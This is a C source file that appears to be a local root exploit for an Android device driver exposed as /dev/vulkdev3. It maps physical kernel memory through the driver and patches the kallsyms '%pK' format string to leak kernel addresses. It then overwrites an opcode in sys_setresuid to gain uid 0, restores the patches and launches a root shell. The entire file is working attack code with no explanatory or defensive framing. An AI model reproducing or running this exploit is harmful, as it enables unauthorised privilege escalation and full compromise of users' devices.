#include <stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"
#define KERNEL_ADDR 0xc0000000

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int main(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	size_t size;
	unsigned int *addr;
	unsigned long start;
	off_t offset;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	size = 0x15400000;
	start = 0x42424000;
	offset = 0x40000000;
	addr = (unsigned int *)mmap((void *)start, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	printf("mmap addr: %lx\n", (unsigned long)addr);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned int num = 0;
	unsigned long sys_setresuid = 0;
	printf("search string \"%%pK %%c %%s\\n\" in memory...\n");
	while ((unsigned long)addr < start + size - 0x40) {
		char *str = (char *)addr;
		if (!strcmp(str, "%pK %c %s\n")) {
			printf("found string, addr = %p\n", str);
			printf("patch string...\n");
			str[2] = ' ';
			sys_setresuid = get_symbol("sys_setresuid");
			break;
		}
		addr++;
	}
	if (sys_setresuid) {
		printf("sys_setresuid = 0x%lx\n", sys_setresuid);
		unsigned int *p = (unsigned int *)(sys_setresuid - KERNEL_ADDR + start);
		unsigned int *end = p + 200;
		while (p < end) {
			if (*p == 0xe3500000) {
				printf("found target opcode, addr=%p\n", p);
				printf("patch opcode...\n");
				*p = 0xe3500001;
				setresuid(0, 0, 0);
				*p = 0xe3500000;
				char *str = (char *)addr;
				str[2] = 'K';
				break;
			}
			p++;
		}
	}
	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/system/bin/sh", "sh", NULL);
	}
	return 0;
}

